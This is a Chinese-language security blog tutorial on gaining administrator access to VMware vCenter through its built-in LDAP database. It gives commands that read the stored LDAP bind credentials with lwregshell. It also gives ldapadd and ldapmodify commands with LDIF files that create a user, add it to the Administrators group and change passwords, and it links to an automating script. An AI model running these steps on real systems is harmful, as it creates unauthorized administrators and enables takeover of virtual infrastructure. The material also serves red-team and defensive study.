---
layout: post
title: vSphere开发指南5——LDAP
---


## 0x00 前言
---

在之前的三篇文章[《vSphere开发指南1——vSphere Automation API》](https://3gstudent.github.io/vSphere%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%971-vSphere-Automation-API)、[《vSphere开发指南2——vSphere Web Services API》](https://3gstudent.github.io/vSphere%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%972-vSphere-Web-Services-API)和[《vSphere开发指南3——VMware PowerCLI》](https://3gstudent.github.io/vSphere%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%973-VMware-PowerCLI)介绍了同虚拟机交互的方法，但有一个利用前提，需要获得管理员用户的口令。

所以本文将要介绍在vCenter上通过LDAP数据库添加管理员用户的方法，扩宽利用思路。

## 0x01 简介
---

本文将要介绍以下内容：

- 利用方法
- 程序实现

## 0x02 利用方法
---

由于介绍这部分的内容相对较少，我从以下资料获得了一些思路：

https://www.guardicore.com/blog/pwning-vmware-vcenter-cve-2020-3952/

https://kb.vmware.com/s/article/2147280

vCenter默认安装了LDAP数据库，用来存储登录用户的信息

LDAP的凭据信息使用[Likewise](https://github.com/vmware/likewise-open)进行存储

### 1.导出LDAP的凭据信息

运行以下命令以访问likewise shell：

```
/opt/likewise/bin/lwregshell
```

切换目录：

```
cd HKEY_THIS_MACHINE\services\vmdir
```

导出信息：

```
list_values
```

执行结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-10-2/2-1.png)

以上命令可以合并成一句：

```
/opt/likewise/bin/lwregshell list_values '[HKEY_THIS_MACHINE\services\vmdir]'
```

### 2.连接LDAP数据库

vCenter内置了ldapsearch，可以用来查询LDAP数据库信息

查询命令示例：

```
ldapsearch -x -H ldap://192.168.1.1:389 -D "cn=192.168.1.1,ou=Domain Controllers,dc=aaa,dc=bbb" -w "P@ssWord123@@" -b "dc=aaa,dc=bbb"
```

返回结果为文本格式，为了方便分析数据结构，可以改为使用界面化的工具LDAP Browser，下载地址：

http://www.ldapbrowserwindows.com/

导出数据库信息如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-10-2/2-2.png)

### 3.添加用户

经过比较分析，添加用户的操作等价于在`entryDN	 cn=Users,dc=aaa,dc=bbb`下添加了如下信息：

```
# test1, Users, aaa.bbb
dn: CN=test1,CN=Users,DC=aaa,DC=bbb
nTSecurityDescriptor:: AQAHhBQAAAA0AAAAAAAAAFQAAAABBgAAAAAABxUAAACm3bprj60+LPb
 uSMg5729v9AEAAAEGAAAAAAAHFQAAAKbdumuPrT4s9u5IyDnvb28gAgAAAgDAAAUAAAAAEygAMQAH
 IAEGAAAAAAAHFQAAAKbdumuPrT4s9u5IyDnvb2/0AQAAABMoADEAByABBgAAAAAABxUAAACm3bprj
 60+LPbuSMg5729vIAIAAAATKAAxAAcgAQYAAAAAAAcVAAAApt26a4+tPiz27kjIOe9vbwACAAAAEy
 gAEAAAAAEGAAAAAAAHFQAAAKbdumuPrT4s9u5IyDnvb28DAgAAABMYADAAAAABAgAAAAAAByAAAAC
 aAgAA
krbPrincipalKey:: MIGboAMCAQGhAwIBAKIDAgEBpIGJMIGGMEmhRzBFoAMCARKhPgQ8FLCUOdBv
 7cUknLaow8mo+zkUu0LbNaQi7gppLCdhVco2gvzFrhg6O6Ww2I6F0FrZ/EBPnnTuV0ozQdopMDmhN
 zA1oAMCARehLgQsPsHK4inqlDsPbt55cFDjqkiNrbwA9Jw8lfN+3O57RqBPcHiOlTEHU/ZUQoY=
userAccountControl: 0
userPrincipalName: test1@AAA.BBB
sAMAccountName: test1
cn: test1
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
```

添加数据库信息的操作可以使用vCenter内置的ldapadd，命令示例：

```
ldapadd -x -H ldap://192.168.1.1:389 -D "cn=192.168.1.1,ou=Domain Controllers,dc=aaa,dc=bbb" -w "P@ssWord123@@" -f adduser.ldif
```

adduser.ldif的示例内容：

```
dn: CN=test1,CN=Users,DC=aaa,DC=bbb
userPrincipalName: test1@AAA.BBB
sAMAccountName: test1
cn: test1
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
userPassword: P@ssWord123@@
```

**注：**

设置用户密码通过属性userPassword实现，无法通过直接设置属性nTSecurityDescriptor和属性krbPrincipalKey实现

### 4.将用户添加至管理员组

将用户添加至管理员组等价于在`entryDN	cn=Administrators,cn=Builtin,dc=aaa,dc=bbb`下添加属性：`member	CN=test1,CN=Users,DC=aaa,DC=bbb`

修改数据库信息的操作可以使用vCenter内置的ldapmodify，命令示例：

```
ldapmodify -x -H ldap://192.168.1.1:389 -D "cn=192.168.1.1,ou=Domain Controllers,dc=aaa,dc=bbb" -w "P@ssWord123@@" -f addadmin.ldif
```

addadmin.ldif的示例内容：

```
dn: cn=Administrators,cn=Builtin,dc=aaa,dc=bbb
changetype: modify
add: member
member: CN=test1,CN=Users,DC=aaa,DC=bbb
```

### 补充1：修改用户口令

命令示例：

```
ldapmodify -x -H ldap://192.168.1.1:389 -D "cn=192.168.1.1,ou=Domain Controllers,dc=aaa,dc=bbb" -w "P@ssWord123@@" -f changepass.ldif
```

changepass.ldif的示例内容：

```
dn: CN=test1,CN=Users,DC=aaa,DC=bbb
changetype: modify
replace: userPassword
userPassword: P@ssWord123@@45
```

### 补充2：删除用户

命令示例：

```
ldapdelete -x -H ldap://192.168.1.1:389 -D "cn=192.168.1.1,ou=Domain Controllers,dc=aaa,dc=bbb" -w "P@ssWord123@@" "CN=test1,CN=Users,DC=aaa,DC=bbb"
```

至此，管理员用户添加成功，使用新添加的管理员用户可以登录Web管理页面，也能够用来调用vSphere API


## 0x03 程序实现
---

vCenter内置了Python3环境，所以这里使用Python进行实现

需要引用以下三个包：

- os
- sys
- re

vCenter默认支持，能够正常使用


完整代码已上传至github，地址如下：

https://github.com/3gstudent/Homework-of-Python/blob/master/vCenterLDAP_Manage.py

代码支持以下功能：

- adduser，添加一个普通用户
- addadmin，将普通用户设置为管理员用户
- changepass，修改用户口令
- deleteuser，删除一个用户
- getadmin，列出所有管理员用户
- getuser，列出所有用户


## 0x04 小结
---

本文介绍了在vCenter上通过LDAP数据库添加管理员用户的方法，后续可以使用新添加的管理员用户登录Web管理页面或是调用vSphere API。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)










